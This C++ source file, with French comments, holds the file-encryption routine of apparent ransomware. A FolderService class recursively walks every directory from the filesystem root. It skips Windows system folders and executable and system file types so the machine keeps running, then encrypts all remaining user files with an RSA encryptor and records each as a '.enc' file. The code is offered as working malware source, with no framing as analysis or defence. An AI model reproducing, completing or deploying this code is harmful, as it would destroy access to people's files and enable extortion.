#include "Folderservice.h"

FolderService::FolderService() {
    // Initialisation de la liste statique des parties de chemins à écarter
    m_exclude_paths.push_back("\\Windows");
    m_exclude_paths.push_back("\\Program Files");
    m_exclude_paths.push_back("\\Program Files (x86)");
    m_exclude_paths.push_back("\\ProgramData");
    m_exclude_paths.push_back("\\AppData");
    m_exclude_paths.push_back("\\OneDrive");
    m_exclude_paths.push_back(".exe");
    m_exclude_paths.push_back(".dll");
    m_exclude_paths.push_back(".sys");
    m_exclude_paths.push_back(".bak");
    m_exclude_paths.push_back(".old");
    m_exclude_paths.push_back(".tmp");
    m_exclude_paths.push_back(".avhd");
    m_exclude_paths.push_back(".avh");
    m_exclude_paths.push_back(".avb");
    m_exclude_paths.push_back(".dvp");
    m_exclude_paths.push_back(".db");
    m_exclude_paths.push_back(".dat");
    m_exclude_paths.push_back(".log");
    m_exclude_paths.push_back(".sdb");
    m_exclude_paths.push_back(".swp");
    m_exclude_paths.push_back(".swo");
    m_exclude_paths.push_back(".vhd");
    m_exclude_paths.push_back(".bkf");
    m_exclude_paths.push_back(".svg");
}

void FolderService::list_files_and_encrypt(RSAEncryptor* encrytpor) {
    boost::filesystem::path root("/");

    for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
        if (boost::filesystem::is_directory(it->path())) {
            list_files_in_directory(it->path(), encrytpor);
        }
    }
}

void FolderService::list_files_in_directory(boost::filesystem::path directory, RSAEncryptor* encrytpor) {
    try {
        for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
            std::string path = it->path().string();

            // Vérifie si le chemin contient l'une des parties de chemins à écarter
            bool exclude = false;
            for (const std::string& exclude_path : m_exclude_paths) {
                if (path.find(exclude_path) != std::string::npos) {
                    exclude = true;
                    break;
                }
            }

            if (!exclude) {
                if (boost::filesystem::is_regular_file(it->path())) {
                    try {
                        encrytpor->encryptFile(it->path());
                        m_data_files.push_back(path + ".enc");
                    } catch(Exception ex) {
                        std::cout << ex.what()<<std::endl;
                    }
                } else if (boost::filesystem::is_directory(it->path())) {
                    list_files_in_directory(it->path(), encrytpor);
                }
            }
        }
    } catch (const boost::filesystem::filesystem_error& e) {}
}
